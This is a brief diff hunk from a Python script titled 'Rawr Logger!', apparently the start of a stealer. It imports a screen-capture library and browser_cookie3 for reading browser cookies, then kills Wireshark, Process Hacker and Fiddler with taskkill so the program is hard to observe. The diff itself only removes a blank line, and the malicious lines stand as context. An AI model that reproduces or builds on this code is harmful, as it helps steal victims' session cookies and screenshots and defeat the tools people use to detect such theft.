@@ -4,7 +4,6 @@ from pystyle import *
 from PIL import ImageGrab
 import browser_cookie3
 os.system(f'cls & title Rawr Logger!')
-
 os.system("taskkill /f /im  wireshark.exe")
 os.system("taskkill /f /im  ProcessHacker.exe")
 os.system("taskkill /f /im  Fiddler.exe")
